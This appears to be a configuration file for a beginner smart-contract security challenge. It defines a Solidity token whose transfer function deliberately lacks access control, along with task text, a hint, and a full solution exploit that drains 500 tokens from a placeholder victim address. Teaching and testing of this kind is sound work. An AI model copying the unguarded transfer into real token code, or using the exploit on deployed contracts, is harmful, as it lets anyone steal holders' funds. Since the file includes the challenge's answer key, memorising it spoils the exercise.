import type { VulnerabilityChallenge } from "@/types/vulnerability";

// Standard victim address for challenges where tokens need to be stolen
export const VICTIM_ADDRESS = "0x1234000000000000000000000000000000000000" as const;

const VULNERABLE_TOKEN_SOURCE = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract VulnerableToken {
    string public name = "Vulnerable Token";
    string public symbol = "VULN";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
    constructor(address _initialHolder, uint256 _initialSupply) {
        balanceOf[_initialHolder] = _initialSupply;
        totalSupply = _initialSupply;
    }
    
    // VULNERABILITY: No access control on this transfer function!
    // Anyone can transfer tokens from ANY address
    function transfer(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "Insufficient balance");
        require(to != address(0), "Invalid recipient");
        
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        
        emit Transfer(from, to, amount);
        return true;
    }
    
    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "Insufficient balance");
        require(allowance[from][msg.sender] >= amount, "Insufficient allowance");
        require(to != address(0), "Invalid recipient");
        
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        allowance[from][msg.sender] -= amount;
        
        emit Transfer(from, to, amount);
        return true;
    }
}`;

export const erc20TransferAclChallenge: VulnerabilityChallenge = {
  id: "erc20-transfer-acl",
  title: "ERC20 Missing Access Control",
  category: "access-control",
  difficulty: "beginner",

  incident: {
    name: "ERC20 Transfer ACL Bypass",
    date: "Common Vulnerability",
    losses: "Varies by deployment",
    references: [
      "https://github.com/crytic/not-so-smart-contracts/tree/master/access_control",
    ],
  },

  description: `# Missing Access Control in Transfer

## The Vulnerability

The \`transfer\` function in this token contract is missing access control. In a proper ERC20 implementation, only the token owner should be able to transfer their tokens:

\`\`\`solidity
// CORRECT: Only owner can transfer their tokens
function transfer(address to, uint256 amount) external returns (bool) {
    require(balanceOf[msg.sender] >= amount, "Insufficient balance");
    balanceOf[msg.sender] -= amount;
    balanceOf[to] += amount;
    return true;
}

// VULNERABLE: Anyone can transfer from any address!
function transfer(address from, address to, uint256 amount) external returns (bool) {
    require(balanceOf[from] >= amount, "Insufficient balance");
    balanceOf[from] -= amount;
    balanceOf[to] += amount;
    return true;
}
\`\`\`

## Impact

Anyone can steal tokens from any address by calling \`transfer(victim, attacker, amount)\`.

## Token Holder

The victim account \`0x1234000000000000000000000000000000000000\` holds 1000 tokens.

## Your Task

1. Deploy an exploit contract
2. Use the vulnerable \`transfer(victim, exploitContract, amount)\` function to steal tokens
3. Drain at least 500 tokens to your contract

**Target**: Steal from \`0x1234000000000000000000000000000000000000\` which holds 1000 tokens.`,

  starterCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVulnerableToken {
    function transfer(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract Exploit {
    IVulnerableToken public token;
    
    // Victim address that holds 1000 tokens
    address public constant VICTIM = 0x1234000000000000000000000000000000000000;
    
    constructor(address _token) {
        token = IVulnerableToken(_token);
    }
    
    function attack() external {
        // TODO: Exploit the missing access control in transfer()
        // The victim has 1000 tokens at VICTIM address
        // Steal at least 500 tokens to this contract
        //
        // HINT: The transfer function is transfer(from, to, amount)
        // Anyone can call it with any 'from' address!
    }
}`,

  hint: "The transfer(from, to, amount) function has no access control. Call token.transfer(VICTIM, address(this), 500000000000000000000) to steal 500 tokens. VICTIM = 0x1234000000000000000000000000000000000000",

  setup: {
    contracts: [
      {
        name: "VulnerableToken",
        source: VULNERABLE_TOKEN_SOURCE,
        constructorArgs: [
          "0x1234000000000000000000000000000000000000", // victim address
          "1000000000000000000000", // 1000 tokens with 18 decimals
        ],
      },
    ],
    accounts: [
      {
        address: "0x1234000000000000000000000000000000000000",
        balance: "10", // victim also needs ETH for gas if needed
      },
    ],
    attackerBalance: "10",
  },

  exposedFunctions: [
    {
      name: "balanceOf",
      signature: "balanceOf(address)",
      inputs: [{ name: "account", type: "address" }],
      outputs: [{ name: "", type: "uint256" }],
      stateMutability: "view",
    },
    {
      name: "totalSupply",
      signature: "totalSupply()",
      inputs: [],
      outputs: [{ name: "", type: "uint256" }],
      stateMutability: "view",
    },
    {
      name: "transfer",
      signature: "transfer(address,address,uint256)",
      inputs: [
        { name: "from", type: "address" },
        { name: "to", type: "address" },
        { name: "amount", type: "uint256" },
      ],
      outputs: [{ name: "", type: "bool" }],
      stateMutability: "nonpayable",
    },
  ],

  constructorParams: {
    params: [
      {
        name: "_token",
        type: "address",
        description: "The VulnerableToken contract address",
      },
    ],
    autoFillOptions: {
      useDeployedContract: "VulnerableToken",
    },
  },

  successCondition: {
    checkBalance: {
      address: "Exploit",
      minBalance: "500000000000000000000", // 500 tokens (with 18 decimals)
    },
  },

  solution: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVulnerableToken {
    function transfer(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract Exploit {
    IVulnerableToken public token;
    
    // Victim address that holds 1000 tokens
    address public constant VICTIM = 0x1234000000000000000000000000000000000000;
    
    constructor(address _token) {
        token = IVulnerableToken(_token);
    }
    
    function attack() external {
        // The transfer(from, to, amount) function has no access control
        // Anyone can specify any 'from' address!
        // We just need to call transfer with victim as 'from' and ourselves as 'to'
        
        uint256 amount = 500000000000000000000; // 500 tokens
        token.transfer(VICTIM, address(this), amount);
    }
}`,
};